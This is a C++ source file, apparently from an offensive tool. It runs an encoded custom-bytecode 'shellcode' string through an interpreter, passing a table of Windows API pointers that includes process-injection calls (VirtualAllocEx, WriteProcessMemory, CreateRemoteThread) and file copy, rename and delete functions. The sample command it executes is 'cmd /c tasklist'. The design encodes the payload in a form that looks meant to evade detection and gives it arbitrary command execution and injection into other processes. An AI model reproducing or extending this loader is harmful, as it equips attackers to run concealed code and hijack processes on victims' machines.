#include <iostream>
#include <windows.h>

#include "Interpreter.h"

/*
* ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
* 1.Release x64
* 2.C/C++
* 代码生成: 运行库(多线程)
* 3.链接器
* 清单文件: 生成清单(否)
* 调试: 生成调试信息(否)
*/

using namespace std;

int main() {
    // 自定义汇编
    char selfAsm[] = "0_4_q_pq70+i20_q_q38_5_4_q_pq70+i18_q_q30_a_4_d_pq70+i10_d_d18_e_4_q_pq70+i8_q_q10_13_0_q_q28_q__14_11_q_q70_q_i120_1b_4_d_d0_d_i8_20_13_q_q0_q_i0_24_4_d_d10_d_i64_29_4_q_q18_q_pq70+i150_31_2_q_pq18+q0_q__34_4_q_q10_q_pq70+i140_3c_4_q_pq10_q_q0_3f_4_q_q0_q_pq70+i140_47_4_q_q0_q_pq0_4a_4_b_pq0_b_i30_4d_4_q_q0_q_pq70+i148_55_4_d_pq0_d_i1_5b_4_d_pq70+i78_d_i18_63_4_d_pq70+i88_d_i1_6e_4_q_pq70+i80_q_i0_7a_4_d_d0_d_i8_7f_13_q_q0_q_i9_83_16_d_d38_d_d38_86_8_q_q30_q_lq70+i78_8b_8_q_q18_q_lq70+i58_90_8_q_q10_q_lq70+i60_95_4_q_q40_q_pq70+i150_9d_2_q_pq40+q0_q__a1_17_d_d0_d_d0_a3_24_q_iaa_q__a5_22_q_i2c9_q__aa_8_q_q0_q_lq70+ib0_b2_4_q_q28_q_q0_b5_16_d_d0_d_d0_b7_4_d_d10_d_i68_bc_20_b_pq28_b_b0_be_4_d_pq70+ib0_d_i68_c9_4_q_q0_q_pq70+i58_ce_4_q_pq70+i110_q_q0_d6_4_q_q0_q_pq70+i58_db_4_q_pq70+i108_q_q0_e3_16_d_d0_d_d0_e5_4_w_pq70+if0_w_w0_ed_4_d_pq70+iec_d_i101_f8_4_d_d0_d_i8_fd_13_q_q0_q_i8_101_8_q_q10_q_lq70+i90_109_4_q_pq70+i48_q_q10_10e_8_q_q10_q_lq70+ib0_116_4_q_pq70+i40_q_q10_11b_4_q_pq70+i38_q_i0_124_4_q_pq70+i30_q_i0_12d_4_d_pq70+i28_d_i0_135_4_d_pq70+i20_d_i1_13d_16_d_d38_d_d38_140_16_d_d30_d_d30_143_4_q_q18_q_pq70+i130_14b_16_d_d10_d_d10_14d_4_q_q28_q_pq70+i150_155_2_q_pq28+q0_q__158_17_d_d0_d_d0_15a_24_q_i193_q__15c_4_d_d0_d_i8_161_13_q_q0_q_i7_165_4_q_q10_q_pq70+i60_16a_4_q_q18_q_pq70+i150_172_2_q_pq18+q0_q__175_4_d_d0_d_i8_17a_13_q_q0_q_i7_17e_4_q_q10_q_pq70+i58_183_4_q_q18_q_pq70+i150_18b_2_q_pq18+q0_q__18e_22_q_i2c9_q__193_4_d_d0_d_i8_198_13_q_q0_q_i7_19c_4_q_q10_q_pq70+i58_1a1_4_q_q18_q_pq70+i150_1a9_2_q_pq18+q0_q__1ac_4_d_d0_d_i8_1b1_13_q_q0_q_i7_1b5_4_q_q10_q_pq70+i98_1bd_4_q_q18_q_pq70+i150_1c5_2_q_pq18+q0_q__1c8_4_d_d0_d_i8_1cd_13_q_q0_q_i7_1d1_4_q_q10_q_pq70+i90_1d9_4_q_q18_q_pq70+i150_1e1_2_q_pq18+q0_q__1e4_4_q_q0_q_pq70+i148_1ec_4_d_pq0_d_i0_1f2_4_q_q0_q_pq70+i148_1fa_7_q_q0_d_pq0_1fd_4_q_q10_q_pq70+i140_205_9_q_q0_q_pq10_208_4_d_d10_d_i8_20d_13_q_q10_q_ia_211_4_q_pq70+i68_q_q10_216_4_q_pq70+i20_q_i0_21f_8_q_q38_q_lq70+i50_224_4_d_d30_d_i64_22a_4_q_q18_q_q0_22d_4_q_q10_q_pq70+i60_232_4_q_q0_q_pq70+i150_23a_4_q_q28_q_pq70+i68_23f_2_q_pq0+q28_q__242_17_d_d0_d_d0_244_23_q_i2b0_q__246_12_d_pq70+i50_d_i0_24b_23_q_i2b0_q__24d_4_q_q0_q_pq70+i148_255_4_d_d0_d_pq0_257_9_d_d0_d_pq70+i50_25b_4_q_q10_q_pq70+i148_263_4_d_pq10_d_d0_265_4_q_q0_q_pq70+i148_26d_4_d_d0_d_pq0_26f_9_d_d0_d_i64_272_19_q__q__274_4_d_d10_d_i8_279_13_q_q10_q_i1_27d_4_q_pq70+i70_q_q10_282_4_q_q18_q_q0_285_4_q_q0_q_pq70+i140_28d_4_q_q10_q_pq0_290_4_q_q0_q_pq70+i150_298_4_q_q28_q_pq70+i70_29d_2_q_pq0+q28_q__2a0_4_q_q10_q_pq70+i140_2a8_4_q_pq10_q_q0_2ab_22_q_i1f2_q__2b0_4_d_d0_d_i8_2b5_13_q_q0_q_i7_2b9_4_q_q10_q_pq70+i60_2be_4_q_q18_q_pq70+i150_2c6_2_q_pq18+q0_q__2c9_9_q_q70_q_i120_2d0_1_q_q28_q__2d1_3_q__q__!";

    // ShellCode 参数
    char commandPara[] = "cmd /c tasklist";
    int commandParaLength = strlen(commandPara) + 1;
    char* outputData;
    int outputDataLength;
    PVOID funcAddr[] = { malloc, realloc, free, strlen, strtol, ((errno_t(*)(char*, rsize_t, const char*))strcpy_s), ((int(*)(char*, size_t, const char*, ...))sprintf_s), CloseHandle, CreateProcessA, CreatePipe, ReadFile, FindFirstFileA, FindNextFileA, FindClose, GetFullPathNameA, FileTimeToLocalFileTime, FileTimeToSystemTime, strtoull, fopen_s, _fseeki64, fread, fwrite, fclose, CopyFileA, rename, ((int(*)(const char*))remove), CreateDirectoryA, NULL, OpenProcess, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory, CreateRemoteThread };

    // 调用解释器
    MagicInvoke(selfAsm, commandPara, commandParaLength, &outputData, &outputDataLength, funcAddr);

    // ShellCode 输出
    *(outputData + outputDataLength) = '\0';
    cout << outputData;
}